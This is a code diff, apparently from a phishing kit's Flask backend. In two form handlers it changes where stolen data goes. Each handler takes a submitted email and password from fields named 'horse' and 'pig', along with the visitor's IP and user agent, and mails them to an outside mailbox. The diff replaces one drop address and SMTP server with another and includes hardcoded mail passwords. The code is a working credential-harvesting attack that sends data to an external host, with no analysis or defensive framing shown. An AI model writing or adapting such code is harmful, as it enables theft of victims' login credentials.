@@ -145,12 +145,12 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "info@illmovesshapes.online"
-        receiver_email = "Datafile4@protonmail.com"
-        password = "Ge7xM88ewC"
+        sender_email = "ghost@newupdateishere.com"
+        receiver_email = "ghost@newupdateishere.com"
+        password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW KOREA API ... 1"
+        message["Subject"] = "NEW EN API ... 1"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -163,7 +163,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.illmovesshapes.online", 465) as server:
+        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -182,12 +182,12 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "info@illmovesshapes.online"
-        receiver_email = "Datafile4@protonmail.com"
-        password = "Ge7xM88ewC"
+        sender_email = "ghost@newupdateishere.com"
+        receiver_email = "ghost@newupdateishere.com"
+        password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW KOREA API ... 2"
+        message["Subject"] = "NEW EN API ... 2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -200,7 +200,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.illmovesshapes.online", 465) as server:
+        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
